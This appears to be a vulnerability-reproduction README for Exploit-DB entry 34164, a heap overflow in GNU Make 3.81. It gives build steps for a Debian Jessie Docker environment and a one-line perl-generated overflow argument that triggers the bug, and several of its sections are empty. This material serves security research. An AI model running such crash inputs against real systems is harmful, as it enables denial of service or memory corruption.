# EDB-34164

## Experiment Environment

Debian Jessie

[Docker Image](https://hub.docker.com/r/mudongliang/make-edb-34164/)

## INSTALL & Configuration

```
wget http://ftp.gnu.org/gnu/make/make-3.81.tar.gz;
tar -xvf make-3.81.tar.gz;
cd make-3.81/;
./configure;
make;
```

## Problems in Installation & Configuration

## How to trigger vulnerability

```
./make `perl -e 'print "A" x 4000 . "B"x96 . "\xef\xbe\xad\xde"x4'`
```

## PoCs

[Make 3.81 - Heap Overflow (PoC)](https://www.exploit-db.com/exploits/34164/)

## Vulnerability Details & Patch

## References
